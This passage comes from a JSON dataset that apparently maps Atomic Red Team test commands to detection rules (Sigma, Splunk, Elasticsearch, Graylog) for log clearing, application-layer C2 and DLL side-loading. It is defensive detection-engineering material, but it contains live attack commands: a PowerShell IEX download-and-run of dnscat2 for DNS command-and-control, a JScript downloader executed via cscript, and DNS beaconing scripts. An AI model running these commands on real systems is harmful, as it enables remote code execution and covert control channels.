\"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "((Image.keyword:*\\\\\\\\fsutil.exe OR OriginalFileName:\"fsutil.exe\") AND CommandLine.keyword:(*deletejournal* *createjournal*))", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "((Image=\"*\\\\\\\\fsutil.exe\" OR OriginalFileName=\"fsutil.exe\") (CommandLine=\"*deletejournal*\" OR CommandLine=\"*createjournal*\"))", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_id=\"1\" (Image=\"*\\\\\\\\fsutil.exe\" OR OriginalFileName=\"fsutil.exe\") CommandLine IN [\"*deletejournal*\", \"*createjournal*\"])", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?=.*(?:.*(?:.*.*\\\\fsutil\\\\.exe|.*fsutil\\\\.exe)))(?=.*(?:.*.*deletejournal.*|.*.*createjournal.*)))'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "title: Security Eventlog Cleared\nid: f2f01843-e7b8-4f95-a35a-d23584476423\ndescription: Some threat groups tend to delete the local 'Security' Eventlog using certain utitlities\ntags:\n    - attack.defense_evasion\n    - attack.t1070\n    - car.2016-04-002\nauthor: Florian Roth\nlogsource:\n    product: windows\n    service: security\ndetection:\n    selection:\n        EventID:\n            - 517\n            - 1102\n    condition: selection\nfalsepositives:\n    - Rollout of log collection agents (the setup routine often includes a reset of the local Eventlog)\n    - System provisioning (system reset before the golden image creation)\nlevel: high", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: Security Eventlog Cleared\nid: f2f01843-e7b8-4f95-a35a-d23584476423\ndescription: Some threat groups tend to delete the local 'Security' Eventlog using certain utitlities\ntags:\n    - attack.defense_evasion\n    - attack.t1070\n    - car.2016-04-002\nauthor: Florian Roth\nlogsource:\n    product: windows\n    service: security\ndetection:\n    selection:\n        EventID:\n            - 517\n            - 1102\n    condition: selection\nfalsepositives:\n    - Rollout of log collection agents (the setup routine often includes a reset of the local Eventlog)\n    - System provisioning (system reset before the golden image creation)\nlevel: high", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "EventID:(\"517\" OR \"1102\")", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Security-Eventlog-Cleared <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Security Eventlog Cleared\",\\n    \"description\": \"Some threat groups tend to delete the local \\'Security\\' Eventlog using certain utitlities\",\\n    \"tags\": [\\n      \"attack.defense_evasion\",\\n      \"attack.t1070\",\\n      \"car.2016-04-002\"\\n    ],\\n    \"query\": \"EventID:(\\\\\"517\\\\\" OR \\\\\"1102\\\\\")\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"EventID:(\\\\\"517\\\\\" OR \\\\\"1102\\\\\")\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Security Eventlog Cleared\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "EventID:(\"517\" \"1102\")", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "(EventID=\"517\" OR EventID=\"1102\")", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_source=\"Microsoft-Windows-Security-Auditing\" event_id IN [\"517\", \"1102\"])", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*517|.*1102)'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "```", "product": "Splunk", "name": null}, {"query": "index=linux sourcetype=linux_audit syscall=263 | table host,auid,uid,euid,exe,key", "product": "Splunk", "name": null}, {"query": "```", "product": "Splunk", "name": null}, {"query": "```", "product": "Splunk", "name": null}, {"query": "index=linux sourcetype=linux_audit type=PATH name=*.log nametype=delete", "product": "Splunk", "name": null}, {"query": "```", "product": "Splunk", "name": null}, {"query": "```", "product": "Splunk", "name": null}, {"query": "-a always,exit -F arch=b64 -F PATH=/var/log -S unlinkat -F auid>=1000 -F auid!=4294967295 -F key=delete_logs", "product": "Splunk", "name": null}, {"query": "```", "product": "Splunk", "name": null}, {"query": "```", "product": "Splunk", "name": null}, {"query": "index=linux sourcetype=\"bash_history\" rm * .log | table host, user_name, bash_command", "product": "Splunk", "name": null}, {"query": "```", "product": "Splunk", "name": null}], "possible_detections": [{"data_source": "auditlogs (audit.rules)"}, {"data_source": "bash_history logs"}], "attack_paths": []}, {"commands": [{"source": "atomics/T1071/T1071.yaml", "command": "Invoke-WebRequest www.google.com -UserAgent \"HttpBrowser/1.0\" | out-null\nInvoke-WebRequest www.google.com -UserAgent \"Wget/1.9+cvs-stable (Red Hat modified)\" | out-null\nInvoke-WebRequest www.google.com -UserAgent \"Opera/8.81 (Windows NT 6.0; U; en)\" | out-null\nInvoke-WebRequest www.google.com -UserAgent \"*<|>*\" | out-null\n", "name": null}, {"source": "atomics/T1071/T1071.yaml", "command": "curl -s -A \"HttpBrowser/1.0\" -m3 www.google.com\ncurl -s -A \"Wget/1.9+cvs-stable (Red Hat modified)\" -m3 www.google.com\ncurl -s -A \"Opera/8.81 (Windows NT 6.0; U; en)\" -m3 www.google.com\ncurl -s -A \"*<|>*\" -m3 www.google.com\n", "name": null}, {"source": "atomics/T1071/T1071.yaml", "command": "curl -s -A \"HttpBrowser/1.0\" -m3 www.google.com\ncurl -s -A \"Wget/1.9+cvs-stable (Red Hat modified)\" -m3 www.google.com\ncurl -s -A \"Opera/8.81 (Windows NT 6.0; U; en)\" -m3 www.google.com\ncurl -s -A \"*<|>*\" -m3 www.google.com\n", "name": null}, {"source": "atomics/T1071/T1071.yaml", "command": "for($i=0; $i -le #{query_volume}; $i++) { Resolve-DnsName -type \"TXT\" \"#{subdomain}.$(Get-Random -Minimum 1 -Maximum 999999).#{domain}\" -QuickTimeout}\n", "name": null}, {"source": "atomics/T1071/T1071.yaml", "command": "for($i=0; $i -le #{query_volume}; $i++) { Resolve-DnsName -type \"TXT\" \"#{subdomain}.$(Get-Random -Minimum 1 -Maximum 999999).127.0.0.1.xip.io\" -QuickTimeout}\n", "name": null}, {"source": "atomics/T1071/T1071.yaml", "command": "for($i=0; $i -le #{query_volume}; $i++) { Resolve-DnsName -type \"#{query_type}\" \"atomicredteam.$(Get-Random -Minimum 1 -Maximum 999999).#{domain}\" -QuickTimeout}\n", "name": null}, {"source": "atomics/T1071/T1071.yaml", "command": "Set-Location $PathToAtomicsFolder\n.\\T1071\\src\\T1071-dns-beacon.ps1 -Domain 127.0.0.1.xip.io -Subdomain #{subdomain} -QueryType #{query_type} -C2Interval #{c2_interval} -C2Jitter #{c2_jitter} -RunTime #{runtime}\n", "name": null}, {"source": "atomics/T1071/T1071.yaml", "command": "Set-Location $PathToAtomicsFolder\n.\\T1071\\src\\T1071-dns-beacon.ps1 -Domain 127.0.0.1.xip.io -Subdomain atomicredteam -QueryType #{query_type} -C2Interval #{c2_interval} -C2Jitter #{c2_jitter} -RunTime #{runtime}\n", "name": null}, {"source": "atomics/T1071/T1071.yaml", "command": "Set-Location $PathToAtomicsFolder\n.\\T1071\\src\\T1071-dns-beacon.ps1 -Domain #{domain} -Subdomain #{subdomain} -QueryType TXT -C2Interval #{c2_interval} -C2Jitter #{c2_jitter} -RunTime #{runtime}\n", "name": null}, {"source": "atomics/T1071/T1071.yaml", "command": "Set-Location $PathToAtomicsFolder\n.\\T1071\\src\\T1071-dns-domain-length.ps1 -Domain #{domain} -Subdomain #{subdomain} -QueryType TXT\n", "name": null}, {"source": "atomics/T1071/T1071.yaml", "command": "Set-Location $PathToAtomicsFolder\n.\\T1071\\src\\T1071-dns-domain-length.ps1 -Domain 127.0.0.1.xip.io -Subdomain #{subdomain} -QueryType TXT\n", "name": null}, {"source": "atomics/T1071/T1071.yaml", "command": "Set-Location $PathToAtomicsFolder\n.\\T1071\\src\\T1071-dns-domain-length.ps1 -Domain #{domain} -Subdomain atomicredteamatomicredteamatomicredteamatomicredteamatomicredte -QueryType #{query_type}\n", "name": null}, {"source": "atomics/T1071/T1071.yaml", "command": "IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/45836819b2339f0bb64eaf294f8cc783635e00c6/dnscat2.ps1')\nStart-Dnscat2 -Domain example.com -DNSServer #{server_ip}\n", "name": null}, {"source": "atomics/T1071/T1071.yaml", "command": "IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/45836819b2339f0bb64eaf294f8cc783635e00c6/dnscat2.ps1')\nStart-Dnscat2 -Domain example.com -DNSServer 127.0.0.1\n", "name": null}, {"source": "atomics/T1071/T1071.yaml", "command": "echo var url = \"https://128.30.52.100/TR/PNG/iso_8859-1.txt\", fso = WScript.CreateObject('Scripting.FileSystemObject'), request, stream; request = WScript.CreateObject('MSXML2.ServerXMLHTTP'); request.open('GET', url, false); request.send(); if (request.status === 200) {stream = WScript.CreateObject('ADODB.Stream'); stream.Open(); stream.Type = 1; stream.Write(request.responseBody); stream.Position = 0; stream.SaveToFile(filename, 1); stream.Close();} else {WScript.Quit(1);}WScript.Quit(0); > #{script_file}\ncscript //E:Jscript #{script_file}\n", "name": null}, {"source": "atomics/T1071/T1071.yaml", "command": "echo var url = \"https://128.30.52.100/TR/PNG/iso_8859-1.txt\", fso = WScript.CreateObject('Scripting.FileSystemObject'), request, stream; request = WScript.CreateObject('MSXML2.ServerXMLHTTP'); request.open('GET', url, false); request.send(); if (request.status === 200) {stream = WScript.CreateObject('ADODB.Stream'); stream.Open(); stream.Type = 1; stream.Write(request.responseBody); stream.Position = 0; stream.SaveToFile(filename, 1); stream.Close();} else {WScript.Quit(1);}WScript.Quit(0); > %TEMP%\\OSTapGet.js\ncscript //E:Jscript %TEMP%\\OSTapGet.js\n", "name": null}], "command_list": ["Invoke-WebRequest www.google.com -UserAgent \"HttpBrowser/1.0\" | out-null\nInvoke-WebRequest www.google.com -UserAgent \"Wget/1.9+cvs-stable (Red Hat modified)\" | out-null\nInvoke-WebRequest www.google.com -UserAgent \"Opera/8.81 (Windows NT 6.0; U; en)\" | out-null\nInvoke-WebRequest www.google.com -UserAgent \"*<|>*\" | out-null\n", "curl -s -A \"HttpBrowser/1.0\" -m3 www.google.com\ncurl -s -A \"Wget/1.9+cvs-stable (Red Hat modified)\" -m3 www.google.com\ncurl -s -A \"Opera/8.81 (Windows NT 6.0; U; en)\" -m3 www.google.com\ncurl -s -A \"*<|>*\" -m3 www.google.com\n", "curl -s -A \"HttpBrowser/1.0\" -m3 www.google.com\ncurl -s -A \"Wget/1.9+cvs-stable (Red Hat modified)\" -m3 www.google.com\ncurl -s -A \"Opera/8.81 (Windows NT 6.0; U; en)\" -m3 www.google.com\ncurl -s -A \"*<|>*\" -m3 www.google.com\n", "for($i=0; $i -le #{query_volume}; $i++) { Resolve-DnsName -type \"TXT\" \"#{subdomain}.$(Get-Random -Minimum 1 -Maximum 999999).#{domain}\" -QuickTimeout}\n", "for($i=0; $i -le #{query_volume}; $i++) { Resolve-DnsName -type \"TXT\" \"#{subdomain}.$(Get-Random -Minimum 1 -Maximum 999999).127.0.0.1.xip.io\" -QuickTimeout}\n", "for($i=0; $i -le #{query_volume}; $i++) { Resolve-DnsName -type \"#{query_type}\" \"atomicredteam.$(Get-Random -Minimum 1 -Maximum 999999).#{domain}\" -QuickTimeout}\n", "Set-Location $PathToAtomicsFolder\n.\\T1071\\src\\T1071-dns-beacon.ps1 -Domain 127.0.0.1.xip.io -Subdomain #{subdomain} -QueryType #{query_type} -C2Interval #{c2_interval} -C2Jitter #{c2_jitter} -RunTime #{runtime}\n", "Set-Location $PathToAtomicsFolder\n.\\T1071\\src\\T1071-dns-beacon.ps1 -Domain 127.0.0.1.xip.io -Subdomain atomicredteam -QueryType #{query_type} -C2Interval #{c2_interval} -C2Jitter #{c2_jitter} -RunTime #{runtime}\n", "Set-Location $PathToAtomicsFolder\n.\\T1071\\src\\T1071-dns-beacon.ps1 -Domain #{domain} -Subdomain #{subdomain} -QueryType TXT -C2Interval #{c2_interval} -C2Jitter #{c2_jitter} -RunTime #{runtime}\n", "Set-Location $PathToAtomicsFolder\n.\\T1071\\src\\T1071-dns-domain-length.ps1 -Domain #{domain} -Subdomain #{subdomain} -QueryType TXT\n", "Set-Location $PathToAtomicsFolder\n.\\T1071\\src\\T1071-dns-domain-length.ps1 -Domain 127.0.0.1.xip.io -Subdomain #{subdomain} -QueryType TXT\n", "Set-Location $PathToAtomicsFolder\n.\\T1071\\src\\T1071-dns-domain-length.ps1 -Domain #{domain} -Subdomain atomicredteamatomicredteamatomicredteamatomicredteamatomicredte -QueryType #{query_type}\n", "IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/45836819b2339f0bb64eaf294f8cc783635e00c6/dnscat2.ps1')\nStart-Dnscat2 -Domain example.com -DNSServer #{server_ip}\n", "IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/45836819b2339f0bb64eaf294f8cc783635e00c6/dnscat2.ps1')\nStart-Dnscat2 -Domain example.com -DNSServer 127.0.0.1\n", "echo var url = \"https://128.30.52.100/TR/PNG/iso_8859-1.txt\", fso = WScript.CreateObject('Scripting.FileSystemObject'), request, stream; request = WScript.CreateObject('MSXML2.ServerXMLHTTP'); request.open('GET', url, false); request.send(); if (request.status === 200) {stream = WScript.CreateObject('ADODB.Stream'); stream.Open(); stream.Type = 1; stream.Write(request.responseBody); stream.Position = 0; stream.SaveToFile(filename, 1); stream.Close();} else {WScript.Quit(1);}WScript.Quit(0); > #{script_file}\ncscript //E:Jscript #{script_file}\n", "echo var url = \"https://128.30.52.100/TR/PNG/iso_8859-1.txt\", fso = WScript.CreateObject('Scripting.FileSystemObject'), request, stream; request = WScript.CreateObject('MSXML2.ServerXMLHTTP'); request.open('GET', url, false); request.send(); if (request.status === 200) {stream = WScript.CreateObject('ADODB.Stream'); stream.Open(); stream.Type = 1; stream.Write(request.responseBody); stream.Position = 0; stream.SaveToFile(filename, 1); stream.Close();} else {WScript.Quit(1);}WScript.Quit(0); > %TEMP%\\OSTapGet.js\ncscript //E:Jscript %TEMP%\\OSTapGet.js\n"], "technique_id": "T1071", "parsed_datasets": [{"Atomic Red Team Test - Standard Application Layer Protocol": {"display_name": "Standard Application Layer Protocol", "atomic_tests": [{"description": "This test simulates an infected host beaconing to command and control.\nInspired by APTSimulator - https://github.com/NextronSystems/APTSimulator/blob/master/test-sets/command-and-control/malicious-user-agents.bat\n", "supported_platforms": ["windows"], "name": "Malicious User Agents - Powershell", "input_arguments": {"domain": {"default": "www.google.com", "type": "string", "description": "Default domain to simulate against"}}, "executor": {"elevation_required": false, "command": "Invoke-WebRequest #{domain} -UserAgent \"HttpBrowser/1.0\" | out-null\nInvoke-WebRequest #{domain} -UserAgent \"Wget/1.9+cvs-stable (Red Hat modified)\" | out-null\nInvoke-WebRequest #{domain} -UserAgent \"Opera/8.81 (Windows NT 6.0; U; en)\" | out-null\nInvoke-WebRequest #{domain} -UserAgent \"*<|>*\" | out-null\n", "name": "powershell"}}, {"description": "This test simulates an infected host beaconing to command and control.\nInspired by APTSimulator - https://github.com/NextronSystems/APTSimulator/blob/master/test-sets/command-and-control/malicious-user-agents.bat\n", "supported_platforms": ["windows"], "name": "Malicious User Agents - CMD", "input_arguments": {"domain": {"default": "www.google.com", "type": "string", "description": "Default domain to simulate against"}}, "executor": {"command": "curl -s -A \"HttpBrowser/1.0\" -m3 #{domain}\ncurl -s -A \"Wget/1.9+cvs-stable (Red Hat modified)\" -m3 #{domain}\ncurl -s -A \"Opera/8.81 (Windows NT 6.0; U; en)\" -m3 #{domain}\ncurl -s -A \"*<|>*\" -m3 #{domain}\n", "name": "command_prompt"}}, {"description": "This test simulates an infected host beaconing to command and control.\nInspired by APTSimulator - https://github.com/NextronSystems/APTSimulator/blob/master/test-sets/command-and-control/malicious-user-agents.bat\n", "supported_platforms": ["linux", "macos"], "name": "Malicious User Agents - Nix", "input_arguments": {"domain": {"default": "www.google.com", "type": "string", "description": "Default domain to simulate against"}}, "executor": {"command": "curl -s -A \"HttpBrowser/1.0\" -m3 #{domain}\ncurl -s -A \"Wget/1.9+cvs-stable (Red Hat modified)\" -m3 #{domain}\ncurl -s -A \"Opera/8.81 (Windows NT 6.0; U; en)\" -m3 #{domain}\ncurl -s -A \"*<|>*\" -m3 #{domain}\n", "name": "sh"}}, {"description": "This test simulates an infected host sending a large volume of DNS queries to a command and control server.\nThe intent of this test is to trigger threshold based detection on the number of DNS queries either from a single source system or to a single targe domain.\n", "supported_platforms": ["windows"], "name": "DNS Large Query Volume", "input_arguments": {"query_type": {"default": "TXT", "type": "string", "description": "DNS query type"}, "domain": {"default": "127.0.0.1.xip.io", "type": "string", "description": "Default domain to simulate against"}, "subdomain": {"default": "atomicredteam", "type": "string", "description": "Subdomain prepended to the domain name"}, "query_volume": {"default": 1000, "type": "integer", "description": "Number of DNS queries to send"}}, "executor": {"elevation_required": false, "command": "for($i=0; $i -le #{query_volume}; $i++) { Resolve-DnsName -type \"#{query_type}\" \"#{subdomain}.$(Get-Random -Minimum 1 -Maximum 999999).#{domain}\" -QuickTimeout}\n", "name": "powershell"}}, {"description": "This test simulates an infected host beaconing via DNS queries to a command and control server at regular intervals over time.\nThis behaviour is typical of implants either in an idle state waiting for instructions or configured to use a low query volume over time to evade threshold based detection.\n", "supported_platforms": ["windows"], "name": "DNS Regular Beaconing", "input_arguments": {"c2_jitter": {"default": 20, "type": "integer", "description": "Percentage of jitter to add to the C2 interval to create variance in the times between C2 requests"}, "domain": {"default": "127.0.0.1.xip.io", "type": "string", "description": "Default domain to simulate against"}, "subdomain": {"default": "atomicredteam", "type": "string", "description": "Subdomain prepended to the domain name"}, "query_type": {"default": "TXT", "type": "string", "description": "DNS query type"}, "runtime": {"default": 30, "type": "integer", "description": "Time in minutes to run the simulation"}, "c2_interval": {"default": 30, "type": "integer", "description": "Seconds between C2 requests to the command and control server"}}, "executor": {"elevation_required": false, "command": "Set-Location $PathToAtomicsFolder\n.\\T1071\\src\\T1071-dns-beacon.ps1 -Domain #{domain} -Subdomain #{subdomain} -QueryType #{query_type} -C2Interval #{c2_interval} -C2Jitter #{c2_jitter} -RunTime #{runtime}\n", "name": "powershell"}}, {"description": "This test simulates an infected host returning data to a command and control server using long domain names.\nThe simulation involves sending DNS queries that gradually increase in length until reaching the maximum length. The intent is to test the effectiveness of detection of DNS queries for long domain names over a set threshold.\n", "supported_platforms": ["windows"], "name": "DNS Long Domain Query", "input_arguments": {"query_type": {"default": "TXT", "type": "string", "description": "DNS query type"}, "domain": {"default": "127.0.0.1.xip.io", "type": "string", "description": "Default domain to simulate against"}, "subdomain": {"default": "atomicredteamatomicredteamatomicredteamatomicredteamatomicredte", "type": "string", "description": "Subdomain prepended to the domain name (should be 63 characters to test maximum length)"}}, "executor": {"elevation_required": false, "command": "Set-Location $PathToAtomicsFolder\n.\\T1071\\src\\T1071-dns-domain-length.ps1 -Domain #{domain} -Subdomain #{subdomain} -QueryType #{query_type}\n", "name": "powershell"}}, {"description": "This will attempt to start a C2 session using the DNS protocol. You will need to have a listener set up and create DNS records prior to executing this command.\nThe following blogs have more information.\nhttps://github.com/iagox86/dnscat2\nhttps://github.com/lukebaggett/dnscat2-powershell\n", "supported_platforms": ["windows"], "name": "DNS C2", "input_arguments": {"domain": {"default": "example.com", "type": "string", "description": "Domain Name configured to use DNS Server where your C2 listener is running"}, "server_ip": {"default": "127.0.0.1", "type": "string", "description": "IP address of DNS server where your C2 listener is running"}}, "executor": {"elevation_required": false, "command": "IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/45836819b2339f0bb64eaf294f8cc783635e00c6/dnscat2.ps1')\nStart-Dnscat2 -Domain #{domain} -DNSServer #{server_ip}\n", "name": "powershell"}}, {"description": "Uses cscript //E:jscript to download a file\n", "supported_platforms": ["windows"], "name": "OSTap Payload Download", "input_arguments": {"file_url": {"default": "https://128.30.52.100/TR/PNG/iso_8859-1.txt", "type": "Url", "description": "URL to retrieve file from"}, "script_file": {"default": "%TEMP%\\OSTapGet.js", "type": "Path", "description": "File to execute jscript code from"}}, "executor": {"elevation_required": false, "command": "echo var url = \"#{file_url}\", fso = WScript.CreateObject('Scripting.FileSystemObject'), request, stream; request = WScript.CreateObject('MSXML2.ServerXMLHTTP'); request.open('GET', url, false); request.send(); if (request.status === 200) {stream = WScript.CreateObject('ADODB.Stream'); stream.Open(); stream.Type = 1; stream.Write(request.responseBody); stream.Position = 0; stream.SaveToFile(filename, 1); stream.Close();} else {WScript.Quit(1);}WScript.Quit(0); > #{script_file}\ncscript //E:Jscript #{script_file}\n", "name": "command_prompt", "cleanup_command": "del #{script_file} /F /Q >nul 2>&1\n"}}], "attack_technique": "T1071"}}], "queries": [], "possible_detections": [], "attack_paths": []}, {"commands": [{"source": "atomics/T1073/T1073.yaml", "command": "$PathToAtomicsFolder\\T1073\\bin\\GUP.exe\n", "name": null}], "command_list": ["$PathToAtomicsFolder\\T1073\\bin\\GUP.exe\n"], "technique_id": "T1073", "parsed_datasets": [{"Atomic Red Team Test - DLL Side-Loading": {"display_name": "DLL Side-Loading", "atomic_tests": [{"description": "GUP is an open source signed binary used by Notepad++ for software updates, and is vulnerable to DLL Side-Loading, thus enabling the libcurl dll to be loaded\n", "supported_platforms": ["windows"], "name": "DLL Side-Loading using the Notepad++ GUP.exe binary", "input_arguments": {"process_name": {"default": "calculator.exe", "type": "string", "description": "Name of the created process"}}, "executor": {"elevation_required": false, "command": "$PathToAtomicsFolder\\T1073\\bin\\GUP.exe\n", "name": "command_prompt", "cleanup_command": "taskkill /F /IM #{process_name}"}}], "attack_technique": "T1073"}}], "queries": [{"query": "action: global\ntitle: DNS ServerLevelPluginDll Install\nid: e61e8a88-59a9-451c-874e-70fcc9740d67\nstatus: experimental\ndescription: Detects the installation of a plugin DLL via ServerLevelPluginDll parameter in Registry, which can be used to execute code in context of the DNS server\n    (restart required)\nreferences:\n    - https://medium.com/@esnesenon/feature-not-bug-dnsadmin-to-dc-compromise-in-one-line-a0f779b8dc83\ndate: 2017/05/08\nauthor: Florian Roth\ntags:\n    - attack.defense_evasion\n    - attack.t1073\ndetection:\n    condition: 1 of them\nfields:\n    - EventID\n    - CommandLine\n    - ParentCommandLine\n    - Image\n    - User\n    - TargetObject\nfalsepositives:\n    - unknown\nlevel: high\n", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "action: global\ntitle: DNS ServerLevelPluginDll Install\nid: e61e8a88-59a9-451c-874e-70fcc9740d67\nstatus: experimental\ndescription: Detects the installation of a plugin DLL via ServerLevelPluginDll parameter in Registry, which can be used to execute code in context of the DNS server\n    (restart required)\nreferences:\n    - https://medium.com/@esnesenon/feature-not-bug-dnsadmin-to-dc-compromise-in-one-line-a0f779b8dc83\ndate: 2017/05/08\nauthor: Florian Roth\ntags:\n    - attack.defense_evasion\n    - attack.t1073\ndetection:\n    condition: 1 of them\nfields:\n    - EventID\n    - CommandLine\n    - ParentCommandLine\n    - Image\n    - User\n    - TargetObject\nfalsepositives:\n    - unknown\nlevel: high\n", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "(EventID:\"13\" AND TargetObject.keyword:*\\\\\\\\services\\\\\\\\DNS\\\\\\\\Parameters\\\\\\\\ServerLevelPluginDll)\\nCommandLine.keyword:dnscmd.exe\\\\ \\\\/config\\\\ \\\\/serverlevelplugindll\\\\ *", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/DNS-ServerLevelPluginDll-Install <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"DNS ServerLevelPluginDll Install\",\\n    \"description\": \"Detects the installation of a plugin DLL via ServerLevelPluginDll parameter in Registry, which can be used to execute code in context of the DNS server (restart required)\",\\n    \"tags\": [\\n      \"attack.defense_evasion\",\\n      \"attack.t1073\"\\n    ],\\n    \"query\": \"(EventID:\\\\\"13\\\\\" AND TargetObject.keyword:*\\\\\\\\\\\\\\\\services\\\\\\\\\\\\\\\\DNS\\\\\\\\\\\\\\\\Parameters\\\\\\\\\\\\\\\\ServerLevelPluginDll)\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"(EventID:\\\\\"13\\\\\" AND TargetObject.keyword:*\\\\\\\\\\\\\\\\services\\\\\\\\\\\\\\\\DNS\\\\\\\\\\\\\\\\Parameters\\\\\\\\\\\\\\\\ServerLevelPluginDll)\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'DNS ServerLevelPluginDll Install\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}Hit on {{_source.@timestamp}}:\\\\n          EventID = {{_source.EventID}}\\\\n      CommandLine = {{_source.CommandLine}}\\\\nParentCommandLine = {{_source.ParentCommandLine}}\\\\n            Image = {{_source.Image}}\\\\n             User = {{_source.User}}\\\\n     TargetObject = {{_source.TargetObject}}================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\ncurl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/DNS-ServerLevelPluginDll-Install-2 <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"DNS ServerLevelPluginDll Install\",\\n    \"description\": \"Detects the installation of a plugin DLL via ServerLevelPluginDll parameter in Registry, which can be used to execute code in context of the DNS server (restart required)\",\\n    \"tags\": [\\n      \"attack.defense_evasion\",\\n      \"attack.t1073\"\\n    ],\\n    \"query\": \"CommandLine.keyword:dnscmd.exe\\\\\\\\ \\\\\\\\/config\\\\\\\\ \\\\\\\\/serverlevelplugindll\\\\\\\\ *\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"CommandLine.keyword:dnscmd.exe\\\\\\\\ \\\\\\\\/config\\\\\\\\ \\\\\\\\/serverlevelplugindll\\\\\\\\ *\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'DNS ServerLevelPluginDll Install\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}Hit on {{_source.@timestamp}}:\\\\n          EventID = {{_source.EventID}}\\\\n      CommandLine = {{_source.CommandLine}}\\\\nParentCommandLine = {{_source.ParentCommandLine}}\\\\n            Image = {{_source.Image}}\\\\n             User = {{_source.User}}\\\\n     TargetObject = 